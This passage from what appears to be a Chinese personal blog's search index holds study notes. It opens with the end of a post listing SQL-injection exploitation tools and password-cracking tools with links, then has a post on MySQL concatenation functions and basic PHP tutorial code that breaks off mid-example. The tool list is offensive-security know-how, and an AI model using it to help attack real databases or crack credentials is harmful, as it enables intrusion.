href="https://github.com/GDSSecurity/SQLBruteo">https://github.com/GDSSecurity/SQLBruteo</a></p></li><li><p>Bobcat 是一款基于 Windows GUI 的工具，支持 Microsoft SQL Server 漏洞利用：<a href="http://web.mac.com/nmonkee/pub/bobcat.html">http://web.mac.com/nmonkee/pub/bobcat.html</a> </p></li><li><p>BSQL Hacker在SQL注入利用领域是一款相对较新的工具。是一种基于Windows的GUI 应用程序，支持Microsoft SQL Server、Oracle和MySQL,并支持SQL盲注和基于错误的 SQL 注入技术：<a href="http://labs.portcullis.co.uk/application/bsql-hacker/">http://labs.portcullis.co.uk/application/bsql-hacker/</a></p></li><li><p>很多攻击者认为SQLMap是目前最好的SQL注入漏洞利用工具：<a href="http://sqlmap.source-fbrge.net/">http://sqlmap.source- fbrge.net/</a></p></li><li><p>Sqlninja是一款使用Perl编写的且关注获取代码执行的Microsoft SQL注入工具：<a href="http://sqlninja.sourceforge.net/">http://sqlninja.sourceforge.net/</a></p></li><li><p>Squeeza被作为BlackHat展示的一部分发布。它关注的是可选的通信通道，支持Microsoft SQL Server： <a href="http://www.sensepost.com/research/squeezao">www.sensepost.com/research/squeezao</a></p></li></ul><h4 id="口令破解工具"><a href="#口令破解工具" class="headerlink" title="口令破解工具"></a>口令破解工具</h4><ul><li><p>Cain &amp; Abel： <a href="http://www.oxid.it/">www.oxid.it</a></p></li><li><p>Woraauthbf： <a href="http://www.soonerorlater.hu/index.khtml?article_id=513">www.soonerorlater.hu/index.khtml?article_id=513</a></p></li><li><p>Checkpwd: <a href="http://www.red-database-security.com/software/checkpwd.html">www.red-database-security.com/software/checkpwd.html</a></p></li><li><p>John the Ripper： <a href="http://www.openwall.com/john/">www.openwall.com/john/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql中的字符连接</title>
      <link href="/2021/06/01/mysql-zhong-de-zi-fu-lian-jie/"/>
      <url>/2021/06/01/mysql-zhong-de-zi-fu-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql中的字符连接"><a href="#mysql中的字符连接" class="headerlink" title="mysql中的字符连接"></a>mysql中的字符连接</h2><h3 id="两个字符连接函数"><a href="#两个字符连接函数" class="headerlink" title="两个字符连接函数"></a>两个字符连接函数</h3><ul><li><p>concat</p><p>支付串和支付串连接，数字和字符串连接，数字和数字连接</p><p>用法：<code>concat(string1,string2,……)</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/3a856f263eb6da6ab3bed779e32e0173.png"></p></li><li><p>concat_ws</p><p>其实和concat一个意思</p><p>用法：<code>concat_ws(分隔符,string1,string2,……)</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/90bc37652386ffbd8f0580a3d8bbef91.png"></p></li></ul><h3 id="空格连接"><a href="#空格连接" class="headerlink" title="空格连接"></a>空格连接</h3><p>如图连接方式，字符串和字符串，其他都不行</p><p>函数不能以空格连接任意数据类型，在其他函数中可以使用</p><p><img src="https://images.dadream.eu.org/images/2024/07/a95410f44d0ae31ea98c31f23bc20715.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/45f5f8b8e15b7e9ce016c4ab5ff0d1b5.png"></p><p>函数可以</p><h3 id="实际分析"><a href="#实际分析" class="headerlink" title="实际分析"></a>实际分析</h3><p><img src="https://images.dadream.eu.org/images/2024/07/7273d14e7c905925e9c02030a7136613.png"></p><p>可以看到函数在单引号和双引号中都执行不了，以字符串形式返回</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p><code>group_concat</code></p><p>用法：<code>group_concat(列名，分隔符)</code>分隔符可选，为空则为逗号</p><p>作用：将一列所有的值打印出来</p><p><img src="https://images.dadream.eu.org/images/2024/07/043626be3a8a64fb3d8628ecf8617e12.png"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php复习</title>
      <link href="/2021/05/27/phps-study/"/>
      <url>/2021/05/27/phps-study/</url>
      
        <content type="html"><![CDATA[<h1 id="php-study"><a href="#php-study" class="headerlink" title="php_study"></a>php_study</h1><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//单行注释</span><span class="token comment">/*多行注释*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/*变量以 $ 符号开始，后面跟着变量的名称变量名必须以字母或者下划线字符开始变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）变量名不能包含空格变量名是区分大小写的（$y 和 $Y 是两个不同的变量）*/</span><span class="token comment">//声明</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token variable">$var1</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// 全局变量</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 局部变量</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;测试函数内变量:&lt;p&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量 x 为: <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量 y 为: <span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">yourTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">;</span>    <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">testest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment">//该变量会保留上次调用函数产生的值</span><span class="token punctuation">}</span><span class="token function">testest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;测试函数外变量:&lt;p&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量 x 为: <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量 y 为: <span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">;</span><span class="token function">yourTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;测试函数外变量:&lt;p&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量 x 为: <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量 y 为: <span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>    /*测试函数内变量:变量 x 为:变量 y 为: 101测试函数外变量:变量 x 为: 5变量 y 为: 10测试函数外变量:变量 x 为: 5变量 y 为: 15*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="echo-print"><a href="#echo-print" class="headerlink" title="echo/print"></a>echo/print</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token operator">-</span> 可以输出一个或多个字符串<span class="token keyword">print</span> <span class="token operator">-</span> 只允许输出一个字符串，返回值总为 <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="PHP-EOF"><a href="#PHP-EOF" class="headerlink" title="PHP_EOF"></a>PHP_EOF</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string single-quoted-string">'1'</span><span class="token operator">.</span><span class="token constant">PHP_EOP</span><span class="token operator">.</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOF</span>        &lt;h1&gt;我的第一个标题&lt;/h1&gt;        &lt;p&gt;我的第一个段落。&lt;/p&gt;<span class="token delimiter symbol">EOF<span class="token punctuation">;</span></span></span><span class="token comment">// 结束需要独立一行且前后不能空格</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello world"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token string single-quoted-string">'djh $x'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$z</span><span class="token operator">=</span><span class="token string double-quoted-string">"djh <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$z</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"aaa"</span><span class="token operator">.</span><span class="token string double-quoted-string">"bbbb"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'aa'</span><span class="token operator">.</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string single-quoted-string">'s'</span><span class="token operator">.</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'djh'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0x8C</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token number">0x8C</span><span class="token punctuation">;</span><span class="token comment">//16进制</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">047</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//8进制</span><span class="token variable">$e</span><span class="token operator">=</span><span class="token number">2.4e3</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$g</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">==</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Car</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> <span class="token variable">$color</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token string double-quoted-string">"green"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">color</span> <span class="token operator">=</span> <span class="token variable">$color</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function-definition function">what_color</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">color</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">print_vars</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$prop</span> <span class="token operator">=&gt;</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t<span class="token interpolation"><span class="token variable">$prop</span></span> = <span class="token interpolation"><span class="token variable">$val</span></span>\n"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 实例一个对象</span><span class="token variable">$herbie</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"white"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 显示 herbie 属性</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\therbie: Properties\n"</span><span class="token punctuation">;</span><span class="token function">print_vars</span><span class="token punctuation">(</span><span class="token variable">$herbie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*string(11) "hello world" string(6) "djh $x" string(15) "djh hello world" string(7) "aaabbbb" aaa satestdjhint(140) int(140) int(39) float(2400) bool(false) NULL 10 herbie: Properties color = white*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">//松散比较：使用两个等号 == 比较，只比较值，不比较类型。//严格比较：用三个等号 === 比较，除了比较值，也比较类型。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 == false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 === false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'0 === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'false == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'false === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" == false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" === false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"0" === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" == false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" === false: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" == null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'"" === null: '</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*//松散比较：使用两个等号 == 比较，只比较值，不比较类型。 //严格比较：用三个等号 === 比较，除了比较值，也比较类型。 0 == false: bool(true) 0 === false: bool(false) 0 == null: bool(true) 0 === null: bool(false) false == null: bool(true) false === null: bool(false) "0" == false: bool(true) "0" === false: bool(false) "0" == null: bool(false) "0" === null: bool(false) "" == false: bool(true) "" === false: bool(false) "" == null: bool(true) "" === null: bool(false)*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 不区分大小写的常量名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GREETING"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"欢迎访问 Runoob.com"</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> greeting<span class="token punctuation">;</span>  <span class="token comment">// 输出 "欢迎访问 Runoob.com"</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment">// 输出Hello world! </span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">" world!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token comment">// 输出Hello world! </span><span class="token delimiter important">?&gt;</span></span>    //Hello world!Hello world!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$txt1</span><span class="token operator">=</span><span class="token string double-quoted-string">"Hello world!"</span><span class="token punctuation">;</span><span class="token variable">$txt2</span><span class="token operator">=</span><span class="token string double-quoted-string">"What a nice day!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$txt1</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$txt2</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$GLOBALS</span><span class="token variable">$_SERVER</span><span class="token variable">$_REQUEST</span><span class="token variable">$_POST</span><span class="token variable">$_GET</span><span class="token variable">$_FILES</span><span class="token variable">$_ENV</span><span class="token variable">$_COOKIE</span><span class="token variable">$_SESSION</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ha"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"lo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Peter"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"35"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Ben"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"37"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Joe"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"43"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ages</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Peter'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"35"</span><span class="token punctuation">;</span><span class="token variable">$ages</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ben'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"37"</span><span class="token punctuation">;</span><span class="token variable">$ages</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Joe'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"43"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Peter is "</span> <span class="token operator">.</span> <span class="token variable">$age</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Peter'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" years old."</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token 